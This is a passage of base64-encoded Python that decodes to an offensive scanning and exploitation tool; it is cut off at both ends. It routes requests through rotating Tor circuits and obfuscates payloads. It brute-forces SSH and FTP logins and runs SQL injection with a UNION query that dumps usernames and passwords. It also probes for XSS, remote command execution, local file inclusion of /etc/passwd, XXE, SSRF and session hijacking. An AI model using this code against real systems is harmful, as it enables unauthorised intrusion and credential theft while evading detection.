odXJsLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycywgdGltZW91dD1SRVFVRVNUX1RJTUVPVVQsIHZlcmlmeT1GYWxzZSkKICAgICAgICBpZiByYW5kb20ucmFuZG9tKCkgPiAwLjc6CiAgICAgICAgICAgIHJvdGF0ZV90b3JfY2lyY3VpdCgpCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIltFUlJPUl0gUmVxdWVzdCBmYWlsZWQ6IHtlfSIpCiAgICAgICAgcmV0dXJuIE5vbmUKCiMgLS0tIFZ1bG5lcmFiaWxpdHkgU2Nhbm5lcnMgLS0tCmRlZiBzc2hfc2Nhbihob3N0LCBwb3J0LCBwYXlsb2Fkcyk6CiAgICByZXN1bHRzID0gW10KICAgIGZvciBwYXlsb2FkIGluIHBheWxvYWRzOgogICAgICAgIHVzZXJuYW1lLCBwYXNzd29yZCA9IHBheWxvYWQuc3BsaXQoIjoiKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3NoID0gcGFyYW1pa28uU1NIQ2xpZW50KCkKICAgICAgICAgICAgc3NoLnNldF9taXNzaW5nX2hvc3Rfa2V5X3BvbGljeShwYXJhbWlrby5BdXRvQWRkUG9saWN5KCkpCiAgICAgICAgICAgIHNzaC5jb25uZWN0KGhvc3QsIHBvcnQ9aW50KHBvcnQpLCB1c2VybmFtZT11c2VybmFtZSwgcGFzc3dvcmQ9cGFzc3dvcmQsIHRpbWVvdXQ9UkVRVUVTVF9USU1FT1VUKQogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5HUkVFTn1WdWxuZXJhYmxle1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgICAgICBzc2guY2xvc2UoKQogICAgICAgICAgICBleHBsb2l0X3Jlc3VsdCA9IGYiU1NIIGxvZ2luIHN1Y2Nlc3NmdWwgd2l0aCB7dXNlcm5hbWV9OntwYXNzd29yZH0iCiAgICAgICAgICAgIHNhdmVfY3ZlX2xvZygiU1NIIiwgZiJ7aG9zdH06e3BvcnR9IiwgcGF5bG9hZCwgZXhwbG9pdF9yZXN1bHQpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9Tm90IFZ1bG5lcmFibGU6IHtlfXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIlNTSCIsIGYie2hvc3R9Ontwb3J0fSIsIHBheWxvYWQsIHJlc3VsdFsxXSwgTm9uZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiU1NIIiwgZiJ7aG9zdH06e3BvcnR9IiwgcGF5bG9hZCwgcmVzdWx0WzFdKQogICAgcHJpbnRfcmVzdWx0cyhyZXN1bHRzKQoKZGVmIHNxbF9pbmplY3Rpb24odXJsLCBwYXlsb2Fkcyk6CiAgICByZXN1bHRzID0gW10KICAgIHdpdGggY29uY3VycmVudC5mdXR1cmVzLlRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1NQVhfVEhSRUFEUykgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlcyA9IFtleGVjdXRvci5zdWJtaXQoc2VuZF9zcWxfcGF5bG9hZCwgdXJsLCBwYXlsb2FkKSBmb3IgcGF5bG9hZCBpbiBwYXlsb2Fkc10KICAgICAgICBmb3IgZnV0dXJlIGluIGNvbmN1cnJlbnQuZnV0dXJlcy5hc19jb21wbGV0ZWQoZnV0dXJlcyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcmVzdWx0cy5hcHBlbmQocmVzdWx0KQogICAgICAgICAgICAgICAgaWYgIlZ1bG5lcmFibGUiIGluIHJlc3VsdFsxXToKICAgICAgICAgICAgICAgICAgICBleHBsb2l0X3Jlc3VsdCA9IGV4cGxvaXRfc3FsX2luamVjdGlvbih1cmwsIHJlc3VsdFswXSkKICAgICAgICAgICAgICAgICAgICBpZiBleHBsb2l0X3Jlc3VsdDoKICAgICAgICAgICAgICAgICAgICAgICAgc2F2ZV9jdmVfbG9nKCJTUUwgSW5qZWN0aW9uIiwgdXJsLCByZXN1bHRbMF0sIGV4cGxvaXRfcmVzdWx0KQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArIGYiRXJyb3I6IHtlfSIpCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgc2VuZF9zcWxfcGF5bG9hZCh1cmwsIHBheWxvYWQpOgogICAgdHJ5OgogICAgICAgIG9iZnVzY2F0ZWRfcGF5bG9hZCA9IG9iZnVzY2F0ZV9wYXlsb2FkKHBheWxvYWQpCiAgICAgICAgcmVzcG9uc2UgPSBtYWtlX3N0ZWFsdGh5X3JlcXVlc3QodXJsLCBwYXJhbXM9eyJpZCI6IG9iZnVzY2F0ZWRfcGF5bG9hZH0pCiAgICAgICAgaWYgcmVzcG9uc2UgaXMgTm9uZToKICAgICAgICAgICAgcmV0dXJuIChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjogUmVxdWVzdCBmYWlsZWR7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgaWYgcmUuc2VhcmNoKHIiZXJyb3J8c3ludGF4fG15c3FsfHNxbCIsIHJlc3BvbnNlLnRleHQsIHJlLklHTk9SRUNBU0UpOgogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5HUkVFTn1WdWxuZXJhYmxlIChFcnJvci1CYXNlZCl7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgIyBUaW1lLUJhc2VkIENoZWNrCiAgICAgICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgICAgICAgICBtYWtlX3N0ZWFsdGh5X3JlcXVlc3QodXJsLCBwYXJhbXM9eyJpZCI6IGYie29iZnVzY2F0ZWRfcGF5bG9hZH0gQU5EIFNMRUVQKDUpLS0ifSkKICAgICAgICAgICAgZWxhcHNlZF90aW1lID0gdGltZS50aW1lKCkgLSBzdGFydF90aW1lCiAgICAgICAgICAgIGlmIGVsYXBzZWRfdGltZSA+IDU6CiAgICAgICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5HUkVFTn1WdWxuZXJhYmxlIChUaW1lLUJhc2VkKXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBzYXZlX3RvX2xvZygiU1FMIEluamVjdGlvbiIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdLCByZXNwb25zZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiU1FMIEluamVjdGlvbiIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdKQogICAgICAgIHJldHVybiByZXN1bHQKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gKHBheWxvYWQsIGYie0ZvcmUuUkVEfUVycm9yOiB7ZX0iKQoKZGVmIGV4cGxvaXRfc3FsX2luamVjdGlvbih1cmwsIHBheWxvYWQpOgogICAgdHJ5OgogICAgICAgIGV4cGxvaXRfcGF5bG9hZCA9IGYie3BheWxvYWR9IFVOSU9OIFNFTEVDVCB1c2VybmFtZSwgcGFzc3dvcmQgRlJPTSB1c2Vycy0tIgogICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgcGFyYW1zPXsiaWQiOiBleHBsb2l0X3BheWxvYWR9KQogICAgICAgIGlmIHJlc3BvbnNlIGFuZCAoInVzZXJuYW1lIiBpbiByZXNwb25zZS50ZXh0IG9yICJwYXNzd29yZCIgaW4gcmVzcG9uc2UudGV4dCk6CiAgICAgICAgICAgIHJldHVybiByZXNwb25zZS50ZXh0CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gZiJFeHBsb2l0IGZhaWxlZDoge2V9IgoKZGVmIHhzc19zY2FuKHVybCwgcGF5bG9hZHMpOgogICAgcmVzdWx0cyA9IFtdCiAgICB3aXRoIGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9TUFYX1RIUkVBRFMpIGFzIGV4ZWN1dG9yOgogICAgICAgIGZ1dHVyZXMgPSBbZXhlY3V0b3Iuc3VibWl0KHNlbmRfeHNzX3BheWxvYWQsIHVybCwgcGF5bG9hZCkgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHNdCiAgICAgICAgZm9yIGZ1dHVyZSBpbiBjb25jdXJyZW50LmZ1dHVyZXMuYXNfY29tcGxldGVkKGZ1dHVyZXMpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXN1bHQgPSBmdXR1cmUucmVzdWx0KCkKICAgICAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKHJlc3VsdCkKICAgICAgICAgICAgICAgIGlmICJWdWxuZXJhYmxlIiBpbiByZXN1bHRbMV06CiAgICAgICAgICAgICAgICAgICAgZXhwbG9pdF9yZXN1bHQgPSBmIlhTUyBwYXlsb2FkIGV4ZWN1dGVkOiB7cmVzdWx0WzBdfSIKICAgICAgICAgICAgICAgICAgICBzYXZlX2N2ZV9sb2coIlhTUyIsIHVybCwgcmVzdWx0WzBdLCBleHBsb2l0X3Jlc3VsdCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIkVycm9yOiB7ZX0iKQogICAgcHJpbnRfcmVzdWx0cyhyZXN1bHRzKQoKZGVmIHNlbmRfeHNzX3BheWxvYWQodXJsLCBwYXlsb2FkKToKICAgIHRyeToKICAgICAgICBvYmZ1c2NhdGVkX3BheWxvYWQgPSBvYmZ1c2NhdGVfcGF5bG9hZChwYXlsb2FkKQogICAgICAgIGRhdGEgPSB7ImlucHV0Ijogb2JmdXNjYXRlZF9wYXlsb2FkfQogICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgbWV0aG9kPSJQT1NUIiwgZGF0YT1kYXRhKQogICAgICAgIGlmIHJlc3BvbnNlIGlzIE5vbmU6CiAgICAgICAgICAgIHJldHVybiAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9RXJyb3I6IFJlcXVlc3QgZmFpbGVke1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGlmIHJlLnNlYXJjaChyIjxzY3JpcHQ+fGFsZXJ0fFhTUyIsIHJlc3BvbnNlLnRleHQsIHJlLklHTk9SRUNBU0UpOgogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5HUkVFTn1WdWxuZXJhYmxle1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBzYXZlX3RvX2xvZygiWFNTIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0sIHJlc3BvbnNlKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJYU1MiLCB1cmwsIHBheWxvYWQsIHJlc3VsdFsxXSkKICAgICAgICByZXR1cm4gcmVzdWx0CiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKCmRlZiBjc3JmX3NjYW4odXJsLCBwYXlsb2Fkcyk6CiAgICByZXN1bHRzID0gW10KICAgIGZvciBwYXlsb2FkIGluIHBheWxvYWRzOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSBtYWtlX3N0ZWFsdGh5X3JlcXVlc3QodXJsLCBtZXRob2Q9IlBPU1QiLCBkYXRhPXsiY3NyZl90b2tlbiI6IHBheWxvYWR9KQogICAgICAgICAgICBpZiByZXNwb25zZSBhbmQgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59UG90ZW50aWFsIENTUkYgKE5vIFRva2VuIFZhbGlkYXRpb24pe1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfU5vdCBWdWxuZXJhYmxle1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfUVycm9yOiB7ZX0iKQogICAgICAgIHJlc3VsdHMuYXBwZW5kKHJlc3VsdCkKICAgICAgICBzYXZlX3RvX2xvZygiQ1NSRiIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdLCByZXNwb25zZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiQ1NSRiIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdKQogICAgcHJpbnRfcmVzdWx0cyhyZXN1bHRzKQoKZGVmIHJjZV9zY2FuKHVybCwgcGF5bG9hZHMpOgogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgcGF5bG9hZCBpbiBwYXlsb2FkczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgcGFyYW1zPXsiY21kIjogcGF5bG9hZH0pCiAgICAgICAgICAgIGlmIHJlc3BvbnNlIGFuZCAoInJvb3Q6IiBpbiByZXNwb25zZS50ZXh0IG9yICJ3d3ctZGF0YSIgaW4gcmVzcG9uc2UudGV4dCk6CiAgICAgICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5HUkVFTn1WdWxuZXJhYmxle1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfU5vdCBWdWxuZXJhYmxle1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfUVycm9yOiB7ZX0iKQogICAgICAgIHJlc3VsdHMuYXBwZW5kKHJlc3VsdCkKICAgICAgICBzYXZlX3RvX2xvZygiUkNFIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0sIHJlc3BvbnNlKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJSQ0UiLCB1cmwsIHBheWxvYWQsIHJlc3VsdFsxXSkKICAgIHByaW50X3Jlc3VsdHMocmVzdWx0cykKCmRlZiBsZmlfc2Nhbih1cmwsIHBheWxvYWRzKToKICAgIHJlc3VsdHMgPSBbXQogICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNwb25zZSA9IG1ha2Vfc3RlYWx0aHlfcmVxdWVzdCh1cmwsIHBhcmFtcz17ImZpbGUiOiBwYXlsb2FkfSkKICAgICAgICAgICAgaWYgcmVzcG9uc2UgYW5kICgicm9vdDoiIGluIHJlc3BvbnNlLnRleHQgb3IgImV0Yy9wYXNzd2QiIGluIHJlc3BvbnNlLnRleHQpOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59VnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIkxGSSIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdLCByZXNwb25zZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiTEZJIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0pCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgZGlyZWN0b3J5X3RyYXZlcnNhbF9zY2FuKHVybCwgcGF5bG9hZHMpOgogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgcGF5bG9hZCBpbiBwYXlsb2FkczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgcGFyYW1zPXsicGF0aCI6IHBheWxvYWR9KQogICAgICAgICAgICBpZiByZXNwb25zZSBhbmQgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwIGFuZCAiaW5kZXggb2YiIGluIHJlc3BvbnNlLnRleHQubG93ZXIoKToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLkdSRUVOfVZ1bG5lcmFibGV7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9Tm90IFZ1bG5lcmFibGV7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9RXJyb3I6IHtlfSIpCiAgICAgICAgcmVzdWx0cy5hcHBlbmQocmVzdWx0KQogICAgICAgIHNhdmVfdG9fbG9nKCJEaXJlY3RvcnkgVHJhdmVyc2FsIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0sIHJlc3BvbnNlKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJEaXJlY3RvcnkgVHJhdmVyc2FsIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0pCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgc2Vzc2lvbl9oaWphY2tpbmdfc2Nhbih1cmwsIHBheWxvYWRzKToKICAgIHJlc3VsdHMgPSBbXQogICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjb29raWVzID0geyJzZXNzaW9uX2lkIjogcGF5bG9hZH0KICAgICAgICAgICAgcmVzcG9uc2UgPSBtYWtlX3N0ZWFsdGh5X3JlcXVlc3QodXJsLCBoZWFkZXJzPXsiQ29va2llIjogZiJzZXNzaW9uX2lkPXtwYXlsb2FkfSJ9KQogICAgICAgICAgICBpZiByZXNwb25zZSBhbmQgImFkbWluIiBpbiByZXNwb25zZS50ZXh0Lmxvd2VyKCk6CiAgICAgICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5HUkVFTn1WdWxuZXJhYmxlIChTZXNzaW9uIEhpamFja2VkKXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIlNlc3Npb24gSGlqYWNraW5nIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0sIHJlc3BvbnNlKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJTZXNzaW9uIEhpamFja2luZyIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdKQogICAgcHJpbnRfcmVzdWx0cyhyZXN1bHRzKQoKZGVmIGluc2VjdXJlX2RhdGFfc3RvcmFnZV9zY2FuKHVybCwgcGF5bG9hZHMpOgogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgcGF5bG9hZCBpbiBwYXlsb2FkczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgcGFyYW1zPXsiZGF0YSI6IHBheWxvYWR9KQogICAgICAgICAgICBpZiByZXNwb25zZSBhbmQgcGF5bG9hZCBpbiByZXNwb25zZS50ZXh0OgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59VnVsbmVyYWJsZSAoRGF0YSBFeHBvc2VkKXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIkluc2VjdXJlIERhdGEgU3RvcmFnZSIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdLCByZXNwb25zZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiSW5zZWN1cmUgRGF0YSBTdG9yYWdlIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0pCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgeHhlX3NjYW4odXJsLCBwYXlsb2Fkcyk6CiAgICByZXN1bHRzID0gW10KICAgIGZvciBwYXlsb2FkIGluIHBheWxvYWRzOgogICAgICAgIHRyeToKICAgICAgICAgICAgaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3htbCJ9CiAgICAgICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgbWV0aG9kPSJQT1NUIiwgZGF0YT1wYXlsb2FkLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIGlmIHJlc3BvbnNlIGFuZCAoInJvb3Q6IiBpbiByZXNwb25zZS50ZXh0IG9yICJYWEUiIGluIHJlc3BvbnNlLnRleHQpOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59VnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIlhYRSIsIHVybCwgcGF5bG9hZCwgcmVzdWx0WzFdLCByZXNwb25zZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiWFhFIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0pCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgc3NyZl9zY2FuKHVybCwgcGF5bG9hZHMpOgogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgcGF5bG9hZCBpbiBwYXlsb2FkczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gbWFrZV9zdGVhbHRoeV9yZXF1ZXN0KHVybCwgcGFyYW1zPXsidXJsIjogcGF5bG9hZH0pCiAgICAgICAgICAgIGlmIHJlc3BvbnNlIGFuZCAoImxvY2FsaG9zdCIgaW4gcmVzcG9uc2UudGV4dCBvciAiaW50ZXJuYWwiIGluIHJlc3BvbnNlLnRleHQpOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59VnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIlNTUkYiLCB1cmwsIHBheWxvYWQsIHJlc3VsdFsxXSwgcmVzcG9uc2UpCiAgICAgICAgZ2VuZXJhdGVfaHRtbF9yZXBvcnQoIlNTUkYiLCB1cmwsIHBheWxvYWQsIHJlc3VsdFsxXSkKICAgIHByaW50X3Jlc3VsdHMocmVzdWx0cykKCmRlZiB4c3NpX3NjYW4odXJsLCBwYXlsb2Fkcyk6CiAgICByZXN1bHRzID0gW10KICAgIGZvciBwYXlsb2FkIGluIHBheWxvYWRzOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSBtYWtlX3N0ZWFsdGh5X3JlcXVlc3QodXJsLCBwYXJhbXM9eyJjYWxsYmFjayI6IHBheWxvYWR9KQogICAgICAgICAgICBpZiByZXNwb25zZSBhbmQgKCJzZWNyZXQiIGluIHJlc3BvbnNlLnRleHQgb3IgInRva2VuIiBpbiByZXNwb25zZS50ZXh0KToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLkdSRUVOfVZ1bG5lcmFibGV7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9Tm90IFZ1bG5lcmFibGV7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9RXJyb3I6IHtlfSIpCiAgICAgICAgcmVzdWx0cy5hcHBlbmQocmVzdWx0KQogICAgICAgIHNhdmVfdG9fbG9nKCJYU1NJIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0sIHJlc3BvbnNlKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJYU1NJIiwgdXJsLCBwYXlsb2FkLCByZXN1bHRbMV0pCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgZnRwX3NjYW4oaG9zdCwgcG9ydCwgcGF5bG9hZHMpOgogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgcGF5bG9hZCBpbiBwYXlsb2FkczoKICAgICAgICB1c2VybmFtZSwgcGFzc3dvcmQgPSBwYXlsb2FkLnNwbGl0KCI6IikKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZ0cCA9IEZUUCgpCiAgICAgICAgICAgIGZ0cC5jb25uZWN0KGhvc3QsIGludChwb3J0KSwgdGltZW91dD1SRVFVRVNUX1RJTUVPVVQpCiAgICAgICAgICAgIGZ0cC5sb2dpbih1c2VybmFtZSwgcGFzc3dvcmQpCiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLkdSRUVOfVZ1bG5lcmFibGV7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIGZ0cC5xdWl0KCkKICAgICAgICAgICAgZXhwbG9pdF9yZXN1bHQgPSBmIkZUUCBsb2dpbiBzdWNjZXNzZnVsIHdpdGgge3VzZXJuYW1lfTp7cGFzc3dvcmR9IgogICAgICAgICAgICBzYXZlX2N2ZV9sb2coIkZUUCIsIGYie2hvc3R9Ontwb3J0fSIsIHBheWxv